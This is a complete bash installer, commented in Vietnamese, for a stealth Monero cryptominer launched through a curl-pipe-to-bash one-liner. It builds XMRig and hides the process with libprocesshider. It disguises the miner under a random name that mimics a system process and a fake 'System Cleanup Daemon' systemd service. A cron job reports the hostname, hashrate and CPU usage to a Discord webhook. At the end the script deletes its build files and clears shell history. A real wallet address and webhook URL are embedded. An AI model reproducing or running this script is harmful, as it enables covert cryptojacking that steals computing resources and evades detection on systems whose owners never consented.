#!/bin/bash
# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3_stealth.sh)

# ========== CONFIG ==========
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
POOL="pool.hashvault.pro:443"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vtSNXOhRKQcinbADhtbsM720wiN3WEkYm1wZbL30D0GD9P84d1VF9xaCoVdK"
WORKER="stealth_$(hostname)"

TOTAL_CORES=$(nproc)
CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.85)}")
PRIORITY=0

CUSTOM_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
INSTALL_DIR="$HOME/.local/share/.system"
SERVICE_NAME=$(shuf -n1 -e "sysdaemon" "core-logger" "netwatchd" "usb-handler")
LOG_FILE="/tmp/.core-log.txt"
# ============================

echo "🛠️ Đang cài đặt XMRig stealth + tối ưu hiệu suất..."

# Cài gói cần thiết
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl

# Bật HugePages để tăng tốc
sudo sysctl -w vm.nr_hugepages=128
sudo bash -c 'echo "vm.nr_hugepages=128" >> /etc/sysctl.conf'

# Clone & build XMRig
cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTAL_CORES

# Cài libprocesshider để ẩn tiến trình
cd ~
rm -rf libprocesshider
git clone https://github.com/kernelcoder/libprocesshider.git
cd libprocesshider
make
sudo make install

# Tạo thư mục ẩn & copy file
mkdir -p "$INSTALL_DIR"
cp ~/xmrig/build/xmrig "$INSTALL_DIR/$CUSTOM_NAME"
chmod +x "$INSTALL_DIR/$CUSTOM_NAME"

# Ẩn process khỏi ps/top
sudo bash -c "echo $CUSTOM_NAME >> /usr/local/lib/.ph"

# Tạo systemd service ngụy trang
sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
[Unit]
Description=System Cleanup Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
  --max-cpu-usage=85 --log-file=$LOG_FILE
Restart=always
Nice=0

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt & chạy service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

# Tạo script gửi log Discord
tee "$INSTALL_DIR/logger.sh" > /dev/null << EOF
#!/bin/bash
WEBHOOK="$DISCORD_WEBHOOK"
PROCESS_NAME="$CUSTOM_NAME"
HOST="\$(hostname)"
HASHRATE="Unknown"
LOG_FILE="$LOG_FILE"

if [ -f "\$LOG_FILE" ]; then
  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
fi

CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
UPTIME=\$(uptime -p)
THREADS=\$(nproc)

curl -s -H "Content-Type: application/json" -X POST -d "{
  \\"username\\": \\"XMRig Stealth\\",
  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đang đào XMR\\n🔧 Process: \\\`$CUSTOM_NAME\\\`\\n🧵 Threads: \\\`\$THREADS\\\`\\n⚡ Hashrate: \\\`\$HASHRATE\\\`\\n💻 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n🕒 Uptime: \\\`\$UPTIME\\\`\\"
}" "\$WEBHOOK" > /dev/null 2>&1
EOF

chmod +x "$INSTALL_DIR/logger.sh"

# Cron gửi log mỗi 5 phút
(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logger.sh") | crontab -

# Gửi ping đầu tiên
"$INSTALL_DIR/logger.sh"

# Xoá dấu vết
cd ~
rm -rf xmrig libprocesshider
history -c

echo ""
echo "✅ Đã khởi động XMRig stealth mode! Log sẽ gửi về Discord mỗi 5 phút. 🚀"

# Không chạy htop để tránh lộ
